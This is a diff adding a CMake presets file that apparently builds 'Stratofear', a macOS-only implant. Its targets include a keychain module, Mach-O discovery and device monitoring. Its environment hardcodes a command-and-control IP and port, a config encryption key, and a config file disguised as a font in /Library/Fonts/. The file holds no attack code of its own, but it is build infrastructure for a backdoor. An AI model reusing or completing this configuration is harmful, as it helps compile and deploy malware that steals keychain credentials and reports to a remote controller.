@@ -1,0 +1,133 @@
+{
+  "version": 6,
+  "cmakeMinimumRequired": {
+    "major": 3,
+    "minor": 26,
+    "patch": 0
+  },
+  "configurePresets": [
+    {
+      "name": "default",
+      "binaryDir": "${sourceDir}/build",
+      "installDir": "${sourceDir}/install",
+      "generator": "Ninja Multi-Config",
+      "architecture": {
+        "value": "x64",
+        "strategy": "external"
+      },
+      "cacheVariables": {
+        "CMAKE_MODULE_PATH": "${sourceDir}/cmake",
+        "CMAKE_CXX_STANDARD": "26",
+        "CMAKE_C_STANDARD": "23",
+        "CMAKE_OSX_ARCHITECTURES": "x86_64",
+        "CMAKE_CONFIGURATION_TYPES": "Debug;Release;",
+        "CMAKE_CXX_COMPILER": "/usr/bin/clang++"
+      },
+      "environment": {
+        "C2_DOMAIN": "199.88.44.96",
+        "C2_PORT": "443",
+        "CONFIG_ENC_KEY": "badapples",
+        "CONFIG_PATH_ENV": "/Library/Fonts/",
+        "CONFIG_FILENAME_ENV": "pingfang.ttf.md5",
+        "MODULE_USERNAME": "ranrok",
+        "CERT_PATH_ENV": "${sourceDir}/stratofear.pem",
+        "HEADER_PATH_ENV": "${sourceDir}/include/cert.hpp"
+      },
+      "condition": {
+        "type": "equals",
+        "lhs": "${hostSystemName}",
+        "rhs": "Darwin"
+      }
+    }
+  ],
+  "buildPresets": [
+    {
+        "name": "release",
+        "description": "Build Stratofear targets with release configuration",
+        "configurePreset": "default",
+        "inheritConfigureEnvironment": true,
+        "configuration": "Release",
+        "targets": [
+          "main",
+          "stratofear-test", 
+          "module_keychain", 
+          "macho_discovery", 
+          "macho_monitorDevices", 
+          "runnerPath",
+          "test_module",
+          "configGenerator"
+      ]
+    },
+    {
+      "name": "debug",
+      "description": "Build Stratofear targets with debug configuration",
+      "configurePreset": "default",
+      "inheritConfigureEnvironment": true,
+      "configuration": "Debug",
+      "targets": [
+        "main",
+        "stratofear-test", 
+        "module_keychain", 
+        "macho_discovery", 
+        "macho_monitorDevices", 
+        "runner",
+        "runnerPath",
+        "test_module",
+        "configGenerator"
+      ]
+    }
+  ],
+  "testPresets": [
+    {
+      "name": "stratofear",
+      "configurePreset": "default",
+      "configuration": "Debug",
+      "inheritConfigureEnvironment": true
+    },
+    {
+      "name": "all",
+      "configurePreset": "default",
+      "configuration": "Debug",
+      "inheritConfigureEnvironment": true
+    }
+  ],
+"workflowPresets": [
+    {
+      "name": "cicd-debug",
+      "description": "Build all STRATOFEAR debug targets",
+      "steps": [
+        {
+          "type": "configure",
+          "name": "default"
+        },
+        {
+          "type": "build",
+          "name": "debug"
+        },
+        {
+          "type": "test",
+          "name": "all"
+        }
+      ]
+    },
+    {
+      "name": "cicd-release",
+      "description": "Build all STRATOFEAR release targets",
+      "steps": [
+        {
+          "type": "configure",
+          "name": "default"
+        },
+        {
+          "type": "build",
+          "name": "release"
+        },
+        {
+          "type": "test",
+          "name": "all"
+        }
+      ]
+    }
+  ]
+}
+
